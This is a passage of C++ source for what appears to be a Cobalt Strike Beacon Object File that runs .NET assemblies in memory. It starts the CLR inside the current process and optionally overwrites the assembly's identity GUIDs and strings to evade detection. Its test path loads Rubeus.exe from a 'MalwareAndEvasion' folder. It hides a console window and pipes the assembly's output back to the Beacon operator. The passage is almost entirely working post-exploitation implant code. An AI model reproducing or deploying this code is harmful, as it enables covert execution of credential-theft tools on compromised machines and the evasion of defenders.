				// dont forget one indexed
			}
		}

		// free our header pointer table
		GlobalFree(StreamHeaders);

		delete_vector(CustomAttributesToInspectFirst);
		delete_vector(CustomAttributesToInspectSecond);
		delete_vector(OffsetsIntoGUIDToStomp);
		delete_vector(OffsetsIntoStringToStomp);
		return true;
	}

    void go(char* args, int len) {
        /**
         * Define the Dynamic Function Resolution declaration for the GetSystemDirectoryA function
         * This time we use the DFR_LOCAL macro which create a local function pointer variable that
         * points to GetSystemDirectoryA. Therefore, we do have to map GetSystemDirectoryA to
         * KERNEL32$GetSystemDirectoryA
         
        DFR_LOCAL(KERNEL32, GetSystemDirectoryA);
        char path[MAX_PATH + 1];

        UINT bytesCopied = GetSystemDirectoryA(path, sizeof(path));
        if (bytesCopied == 0) {
            BeaconPrintf(CALLBACK_ERROR, "Error: %i", GetLastError());
        }
        else if (bytesCopied <= sizeof(path)) {
            BeaconPrintf(CALLBACK_OUTPUT, "System Directory: %s", path);
        }*/

		//Extract data sent
		datap parser;

		// the go routine is passed the args as packed by bof_pack
		BeaconDataParse(&parser, args, len);

		// \\.\pipe\PipeName
		const char* PipeName = "\\\\.\\pipe\\HelloSecolveHere";

		// We could spin up different app domains to segregate, but not implemented for now
		//char* AppDomainName = (char*)"Secolve";
		char* AssemblyArguments = (char*)"";
		char* pipeName = NULL;
		char* slotName = NULL;

		bool bShouldStomp = 0;
		bool bHasArguments = 0;

		BOOL mailSlot = 0;
		ULONG entryPoint = 1;
		size_t AssemblyByteLen = 0;

		// Get the app domain name
		// eh... hardcode this...
		// weather update: just use default app domain
		// AppDomainName = BeaconDataExtract(&parser, NULL);
		
		bHasArguments = BeaconDataShort(&parser);
		bShouldStomp = BeaconDataShort(&parser);

		VARIANT Arguments = { 0 };
		Arguments.vt = (VT_ARRAY | VT_BSTR);

		SAFEARRAY* ManagedArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1); // 1 for Main(String[]), TODO: support MAIN() which necessitates a 0 for cElements
		LONG index = 0; // HAVE to provide this
		
		DEBUG_PRINT("bHasArguments: %d\n", (int)bHasArguments);
		DEBUG_PRINT("bShouldStomp: %d\n", (int)bShouldStomp);
		if (bHasArguments) {
			// The first argument is NOT the assembly
			AssemblyArguments = BeaconDataExtract(&parser, NULL);

			// Convert arguments to wide char / unicode
			size_t sArgumentConvertedChars = 0;
			size_t sPreConvertArgumentLength = strlen(AssemblyArguments) + 1;// nullb
			wchar_t* wAssemblyArguments = (wchar_t*)malloc(sPreConvertArgumentLength * sizeof(wchar_t));
			mbstowcs_s(&sArgumentConvertedChars, wAssemblyArguments, sPreConvertArgumentLength, AssemblyArguments, _TRUNCATE);

			int ArgumentCount = 0;
			// convenience func to transform into argv**
			LPWSTR* ArgumentArray = CommandLineToArgvW(wAssemblyArguments, &ArgumentCount);
			DEBUG_PRINT("%d Assembly Arguments\n", ArgumentCount);
			// Safe arrays are a pain to work with...

			//Arguments.parray = SafeArrayCreateVector(VT_BSTR, 0, ArgumentCount);

			SAFEARRAYBOUND ParamsBound[1];
			ParamsBound[0].lLbound = 0;
			ParamsBound[0].cElements = ArgumentCount;

			Arguments.parray = SafeArrayCreate(VT_BSTR, 1, ParamsBound);

			for (LONG i = 0; i < ArgumentCount; i++) {
				// or _com_util::ConvertStringToBSTR
				DEBUG_PRINT("Found Assembly Argument: %S\n", ArgumentArray[i]);
				SafeArrayPutElement(Arguments.parray, &i, SysAllocString(ArgumentArray[i]));
			}

		}
		else {
			SAFEARRAYBOUND ParamsBound[1];
			ParamsBound[0].lLbound = 0;
			ParamsBound[0].cElements = 0;
			Arguments.parray = SafeArrayCreate(VT_BSTR, 1, ParamsBound);
		}

		SafeArrayPutElement(ManagedArguments, &index, &Arguments);

		// alloc target assembly
		TargetAssembly* TAssembly = (TargetAssembly*)malloc(sizeof(TargetAssembly));

#if 1
		// test read local assembly
		HANDLE TempFile = CreateFileA("D:\\MalwareAndEvasion\\Rubeus.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD FileSize = GetFileSize(TempFile, NULL);
		TAssembly->AssemblyBytes = (unsigned char*)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, FileSize);
		ReadFile(TempFile, TAssembly->AssemblyBytes, FileSize, &TAssembly->AssemblySize, NULL);
		CloseHandle(TempFile);
		DEBUG_PRINT("%d bytes read from %d byte file\n", TAssembly->AssemblySize, FileSize);
		
#else 
		// if you send a > 2gb assembly over the wire thats on you
		TAssembly->AssemblySize = 0;
		TAssembly->AssemblyBytes = (unsigned char*) BeaconDataExtract(&parser, (int*) & TAssembly->AssemblySize);
#endif

		if (bShouldStomp) StompIdentity(TAssembly->AssemblyBytes);

		/*
		mailSlot = BeaconDataInt(&parser);
		entryPoint = BeaconDataInt(&parser);
		slotName = BeaconDataExtract(&parser, NULL);
		pipeName = BeaconDataExtract(&parser, NULL);
		
		AssemblyByteLen = BeaconDataInt(&parser);
		char* assemblyBytes = BeaconDataExtract(&parser, NULL);
		*/


		// General vars
		const wchar_t* wNETVer = L"v4.0.30319";

		/* WARNING - HARDCODED ASSEMBLY VERSION RN*/
		// its not too hard to infer the assembly version by grepping for it in the assembly
		// or actually parsing it properly
		// but not doing that for now


		// Same thing for app domain name 
		/*
		size_t sAppDomainNameConvertedChars = 0;
		size_t sPreConvertAppDomainNameLength = strlen(AppDomainName) + 1;// nullb
		wchar_t* wAppDomainName = (wchar_t*)malloc(sPreConvertAppDomainNameLength * sizeof(wchar_t));
		mbstowcs_s(&sAppDomainNameConvertedChars, wAppDomainName, sPreConvertAppDomainNameLength, AppDomainName, _TRUNCATE);
		*/

		// Now - spin up our custom CLR
		HRESULT hr; 

		ICorRuntimeHost* pCorRuntimeHost;
		ICLRRuntimeHost* pRuntimeHost;
		ICLRMetaHost* pMetaHost;
		ICLRRuntimeInfo* pRuntimeInfo;

		hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<void**>(&pMetaHost));

		// TODO: Compatibility version checks and you know, dynamically populating wNETVer 

		hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, wNETVer, IID_ICLRRuntimeInfo, reinterpret_cast<void**>(&pRuntimeInfo));
		hr = pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, reinterpret_cast<void**>(&pRuntimeHost));

		if (FAILED(hr)) {
			BeaconPrintf(CALLBACK_OUTPUT, "Couldn't load CLR interface\n");
			return;
		}

		// Init our custom host control
		CustomHostControl pHostControl;
		pHostControl.lpVtbl = &CustomHostControl_Vtbl;
		pHostControl.TargetAssembly = TAssembly;
		
		// check if loadable. this does nothing until we dynamically populate wNETVer
		BOOL IsLoadable = false;
		hr = pRuntimeInfo->lpVtbl->IsLoadable(pRuntimeInfo, &IsLoadable);

		if (FAILED(hr) || !IsLoadable) {
			BeaconPrintf(CALLBACK_OUTPUT, "Can't load %S CLR\n", wNETVer);
			return;
		}
		hr = pRuntimeHost->lpVtbl->SetHostControl(pRuntimeHost, (IHostControl*) & pHostControl);

		// now start the CLR
		hr = pRuntimeHost->lpVtbl->Start(pRuntimeHost);

		// If CLR fucked up try gracefully leave
		if (hr != S_OK) {
			DEBUG_PRINT("Couldn't start CLR!");
			return;
		}



		/* WARNING/TODO: Is there a better way than loudly calling getprocaddr to resolve the deprecated GetCLRIdentityManager func? */
		// https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/getclridentitymanager-function
		// "Call the GetRealProcAddress function to get a pointer to the GetCLRIdentityManager function."
		// guess for this small use case could compute offsets statically
		typedef HRESULT(__stdcall* fpGetCLRIdentityManager)(REFIID, IUnknown**);
		fpGetCLRIdentityManager pGetCLRIdentityManager = NULL;

		pRuntimeInfo->lpVtbl->GetProcAddress(pRuntimeInfo, "GetCLRIdentityManager", reinterpret_cast<void**>(&pGetCLRIdentityManager));

		ICLRAssemblyIdentityManager* pIdentityManager;
		hr = (pGetCLRIdentityManager)(IID_ICLRAssemblyIdentityManager, reinterpret_cast<IUnknown**>(&pIdentityManager));

		// identity maanger requires an IStream, so create one from our bytes

		// extra sanity checks
		if (TAssembly->AssemblySize <= 0) {
			DEBUG_PRINT("Invalid Assembly size!");
			return;
		}
		if (TAssembly->AssemblyBytes == nullptr) {
			DEBUG_PRINT("Invalid Assembly bytes!");
			return;
		}

		TAssembly->AssemblyStream = SHCreateMemStream((const byte*)TAssembly->AssemblyBytes, TAssembly->AssemblySize);

		if (!TAssembly->AssemblyStream) {
			DEBUG_PRINT("Assembly stream couldn't be allocated!");
			return;
		}

		// hard coded identity string size. 
		// if you go over congratulations
		DWORD IdentityStringSize = 4096;
		TAssembly->AssemblyIdentity = (LPWSTR)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, IdentityStringSize);

		// Grab identity string 
		hr = pIdentityManager->lpVtbl->GetBindingIdentityFromStream(pIdentityManager, TAssembly->AssemblyStream, 0/*CLR_ASSEMBLY_IDENTITY_FLAGS_DEFAULT*/, TAssembly->AssemblyIdentity, &IdentityStringSize);
		if (FAILED(hr)) {
			DEBUG_PRINT("Couldn't load identity string: %d\n", GetLastError());
			return;
		}
		DEBUG_PRINT("Loaded ID String: %S\n", TAssembly->AssemblyIdentity);

		// we want to get an ICorRuntimeHost as opposed to ICLRRuntimeHost so we can call the old Load_* functions
		// https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimeinfo-getinterface-method
		hr = pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<void**>(&pCorRuntimeHost));
		if (FAILED(hr)) {
			DEBUG_PRINT("Couldn't get old CorRuntimeHost: %d\n", GetLastError());
			return;
		}


		_Assembly* pAssembly;
		_MethodInfo* pEntryPoint;

		IUnknown* pAppDomainUnknown;
		AppDomain* pAppDomain;

		BSTR AssemblyIdentityString = SysAllocString(TAssembly->AssemblyIdentity);

		// get default app domain 
		hr = pCorRuntimeHost->lpVtbl->GetDefaultDomain(pCorRuntimeHost, reinterpret_cast<IUnknown**>(&pAppDomainUnknown));

		if (FAILED(hr)) {
			DEBUG_PRINT("Couldn't get default app domain: %d\n", GetLastError());
			return;
		}

		// then query interface to grab the actual type, this is equivalent to getting the default app domain
		hr = pAppDomainUnknown->QueryInterface(IID_AppDomain/*__uuidof(_AppDomain) */ , reinterpret_cast<void**>(&pAppDomain));

		if (FAILED(hr)) {
			DEBUG_PRINT("Couldn't query app domain type from interface: %d\n", GetLastError());
			return;
		}

		// Setup console window
		HWND ConsoleWindow = GetConsoleWindow();

		
		// GetConsoleWindow is "deprecated"
		if (ConsoleWindow == NULL) {
			// alloc console
			DEBUG_PRINT("No console window - allocating new one\n");
			AllocConsole();
			
			ConsoleWindow = GetConsoleWindow();
			if (ConsoleWindow) {
				// hide newly spawned window 
				ShowWindow(ConsoleWindow, SW_HIDE);
			}
			
		}
		

		// redirect std output

		// if necessary later support stderror 
		HANDLE OldStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
		//HANDLE OldStdError = GetStdHandle(STD_ERROR_HANDLE);

		/* 
		
		 "Named pipes are a simple way for two processes to exchange messages.
		 Mailslots, on the other hand, are a simple way for a process to broadcast messages to multiple processes."
		 both are fine - use named pipes for now. Mail slots probably have slightly lower visibility

		*/

		// create pipe
		HANDLE NamedPipeHandle = CreateNamedPipeA(PipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 65535, 65535, 0, NULL);
		// what we actually write to. can also use callnamedpipe
		HANDLE NamedPipeFileHandle = CreateFileA(PipeName, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL); 

		// set std output to write to our named pipe
		if (!SetStdHandle(STD_OUTPUT_HANDLE, NamedPipeFileHandle)) {
			DEBUG_PRINT("Couldn't set standard output handle!\n");
			return;
		}


#if 0
		// load3 debug
		SAFEARRAYBOUND Bounds[1];
		Bounds[0].cElements = TAssembly->AssemblySize;
		Bounds[0].lLbound = 0;

		SAFEARRAY* AssemblyArray = SafeArrayCreate(VT_UI1, 1, Bounds);
		SafeArrayLock(AssemblyArray);
		memcpy(AssemblyArray->pvData, TAssembly->AssemblyBytes, TAssembly->AssemblySize);
		SafeArrayUnlock(AssemblyArray);

		hr = pAppDomain->lpVtbl->Load_3(pAppDomain, AssemblyArray, &pAssembly);
		SafeArrayDestroy(AssemblyArray);
#else 
		// Load 2 method
		hr = pAppDomain->lpVtbl->Load_2(pAppDomain, AssemblyIdentityString, &pAssembly);
#endif
		
		SysFreeString(AssemblyIdentityString);

#ifdef _DEBUG
		// DUMP TYPES AS A DEBUG THING FOR TESTING IMPLANT

		// Get assembly full name 
		BSTR pAssemblyName;
		pAssembly->lpVtbl->get_FullName(pAssembly, &pAssemblyName);
		DEBUG_PRINT("Loaded %ls\n", pAssemblyName);
		
		// entry point 

		// DEBUG LIST METHODS 

		DEBUG_PRINT("[*] ==== LISTING ASSEMBLY INFORMATION ====\n");
		// Helpfully dump entry point
		hr = pAssembly->lpVtbl->get_EntryPoint(pAssembly, &pEntryPoint);
		if (pEntryPoint) {
			BSTR EntryPointString;
			BSTR TypeString;
			_Type* pEntryPointType;
			pEntryPoint->lpVtbl->get_DeclaringType(pEntryPoint, &pEntryPointType);

			pEntryPoint->lpVtbl->get_ToString(pEntryPoint, &EntryPointString);
			pEntryPointType->lpVtbl->get_ToString(pEntryPointType, &TypeString);

			DEBUG_PRINT("Entry point: %ls in %ls\n", EntryPointString, TypeString);
			
			SysFreeString(EntryPointString);
			SysFreeString(TypeString);
		}
		else {
			DEBUG_PRINT("Entry point null!\n");
		}

		DEBUG_PRINT("Listing types...\n");

		SAFEARRAY* ManagedTypes;

		pAssembly->lpVtbl->GetTypes(pAssembly, &ManagedTypes);

		_Type** TypeArray;

		hr = SafeArrayAccessData(ManagedTypes, reinterpret_cast<void**>(&TypeArray));

		if (FAILED(hr)) {
			DEBUG_PRINT("Failed to load Safe Array of types: %d\n", GetLastError());
		}

		// iterate over types
		LONG LowerBound, UpperBound;
		SafeArrayGetLBound(ManagedTypes, 1, &LowerBound);
		SafeArrayGetUBound(ManagedTypes, 1, &UpperBound);

		for (int i = 0; i <= UpperBound - LowerBound; i++) {
			_Type* CurrentType = TypeArray[i];
			BSTR TypeFullName;
			CurrentType->lpVtbl->get_ToString(CurrentType, &TypeFullName);
			DEBUG_PRINT("	- %ls\n", TypeFullName);

			// now iterate over the methods in each type if specified 
			SAFEARRAY* ManagedMethods;
			_MethodInfo** MethodArray;
			CurrentType->lpVtbl->GetMethods(CurrentType, static_cast<BindingFlags>(BindingFlags_Instance | BindingFlags_Static | BindingFlags_Public | BindingFlags_NonPublic), &ManagedMethods);
			hr = SafeArrayAccessData(ManagedMethods, reinterpret_cast<void**>(&MethodArray));

			if (FAILED(hr)) {
				DEBUG_PRINT("[!] Failed to load Safe Array of methods: %d\n", GetLastError());
			}

			LONG LowerBoundT, UpperBoundT;
			SafeArrayGetLBound(ManagedMethods, 1, &LowerBoundT);
			SafeArrayGetUBound(ManagedMethods, 1, &UpperBoundT);

			for (int j = 0; j <= UpperBoundT - LowerBoundT; j++) {
				_MethodInfo* CurrentMethod = MethodArray[j];
				BSTR MethodName;
				CurrentMethod->lpVtbl->get_ToString(CurrentMethod, &MethodName);
				DEBUG_PRINT("		- %ls\n", MethodName);
				SysFreeString(MethodName);
			}

			SafeArrayDestroy(ManagedMethods);

			SysFreeString(TypeFullName);
		}

		SafeArrayDestroy(ManagedTypes);
		

#endif 









		/* --- EXECUTION HARNESS FINISHED --- */
		// Now doing setup for invocation

		// TODO: support arbitrary type param parsing

		// recall that main consumes a String[] 
		// so we feed an Object[] (safearray) with single Variant which is another safearray of strings


		E_ExecuteMethod ExecuteMethod = E_ExecuteMethod::JUMP_ENTRYPOINT;

		switch (ExecuteMethod) {
			default:
			case INVOKE_MEMBER: {
				DEBUG_PRINT("[*] INVOKE_MEMBER NOT IMPLEMENTED\n");
				// todo 
#if 0
				_Type* ManagedType = NULL;

				BSTR ManagedClassName = _com_util::ConvertStringToBSTR(ARG_ExecuteType);
				BSTR ManagedMethodName = _com_util::ConvertStringToBSTR(ARG_ExecuteMethod);

				/*
				_bstr_t ManagedClassName(ARG_ExecuteType);
				_bstr_t ManagedMethodName(ARG_ExecuteMethod);
				*/

				DEBUG_PRINT("[*] Trying to invoke %ls in %ls\n", ManagedClassName, ManagedMethodName);

				// Args


				VARIANT NullObj;
				ZeroMemory(&NullObj, sizeof(VARIANT));
				NullObj.vt = VT_NULL;

				VARIANT ReturnValue;
				ZeroMemory(&ReturnValue, sizeof(VARIANT));


				// "This method is for access to managed classes from unmanaged code"

				pAssembly->GetType_2(ManagedClassName, &ManagedType);

				hr = ManagedType->InvokeMember_3(ManagedMethodName, static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
					NULL, NullObj, ManagedArguments, &ReturnValue);

				if (FAILED(hr)) {
					printf("[!] Couldn't INVOKE_MEMBER: %d\n", GetLastError());
				}

				// variants should be cleared before going out of scope
				VariantClear(&ReturnValue);
				VariantClear(&NullObj);

				SysFreeString(ManagedClassName);
				SysFreeString(ManagedMethodName);
#endif
				break;
			}

			case JUMP_ENTRYPOINT: {
				DEBUG_PRINT("[*] Using JUMP_ENTRYPOINT method to jump to assembly...\n");

				hr = pAssembly->lpVtbl->get_EntryPoint(pAssembly, &pEntryPoint);

				if (pEntryPoint) {
					BSTR EntryPointString;
					BSTR TypeString;
					_Type* pEntryPointType;
					pEntryPoint->lpVtbl->get_DeclaringType(pEntryPoint, &pEntryPointType);

					pEntryPoint->lpVtbl->get_ToString(pEntryPoint, &EntryPointString);
					pEntryPointType->lpVtbl->get_ToString(pEntryPointType, &TypeString);

					DEBUG_PRINT("[+] Jumping to entry point: %ls in %ls\n", EntryPointString, TypeString);
					SysFreeString(EntryPointString);
					SysFreeString(TypeString);
				}
				// recall variant is 16 bytes, first 2 defines data type and rest holds content

				// https://learn.microsoft.com/en-us/dotnet/api/system.reflection.methodbase.invoke?view=net-9.0
				// "This is a convenience method that calls the Invoke(Object, BindingFlags, Binder, Object[], CultureInfo) method overload, passing Default for invokeAttr and null for binder and culture."

				// If we pass nullobj to invoke it treats it as static as (usually) desired


				VARIANT NullObj;
				memset(&NullObj, 0, sizeof(VARIANT));
				NullObj.vt = VT_NULL;

				VARIANT ReturnValue;
				memset(&ReturnValue, 0, sizeof(VARIANT));

				hr = pEntryPoint->lpVtbl->Invoke_2(pEntryPoint, NullObj, static_cast<BindingFlags>(BindingFlags_Default), NULL, ManagedArguments, NULL/* null so culture value of current thread passed*/, &ReturnValue);

				DEBUG_PRINT("Return Value %d\n", ReturnValue.iVal);

				// variants should be cleared before going out of scope
				VariantClear(&ReturnValue);
				VariantClear(&NullObj);

				break;
			}
		}

		DWORD BytesToRead = 65535; // buffer size 
		DWORD BytesRead = 0;
		
		char* Buffer = (char*)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, 65535);
		ReadFile(NamedPipeHandle, (void*)Buffer, BytesToRead, &BytesRead, NULL);

		// throw it back private!
		BeaconPrintf(CALLBACK_OUTPUT, "\n\n%s\n", Buffer);

		// close pipes and restore std out 
		CloseHandle(NamedPipeFileHandle);
		CloseHandle(NamedPipeHandle);

		SetStdHandle(STD_OUTPUT_HANDLE, OldStdOutput);

		// once we hand it off the callee will free it for us
		//SafeArrayDestroy(Arguments.parray);
		//SafeArrayDestroy(ManagedArguments);

		VariantClear(&Arguments);
    
		DEBUG_PRINT("Cleaning up some memory now\n");


		pHostControl.lpVtbl->Release((IHostControl*)& pHostControl);

		if (pAssembly) {
			pAssembly->lpVtbl->Release(pAssembly);
		}

		if (pRuntimeInfo) {
			pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
		}

		if (pMetaHost) {
			pMetaHost->lpVtbl->Release(pMetaHost);
		}

		if (pRuntimeHost) {
			pRuntimeHost->lpVtbl->Release(pRuntimeHost);
		}

		if (pCorRuntimeHost) {
			pCorRuntimeHost->lpVtbl->Release(pCorRuntimeHost);
		}

		if (pAppDomain) {
			pAppDomain->lpVtbl->Release(pAppDomain);
		}

		if (pAppDomainUnknown) {
			pAppDomainUnknown->Release();
		}

		DEBUG_PRINT("All done!\n");
		
	}



    /*
    void sleep_mask(PSLEEPMASK_INFO info, PFUNCTION_CALL funcCall) {
    }
    */
}

// main shim for template debuggin
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<short, const char*>(go, 0, "test args");

    /* To test a sleepmask BOF, the following mockup executors can be used
    // Mock up Beacon and run the sleep mask once
    bof::runMockedSleepMask(sleep_mask);

    // Mock up Beacon with the specific .stage C2 profile
    bof::runMockedSleepMask(sleep_mask,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::True,
            .module = "",
        },
        {
            .sleepTimeMs = 5000,
            .runForever = false,
        }
    );
    */

    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif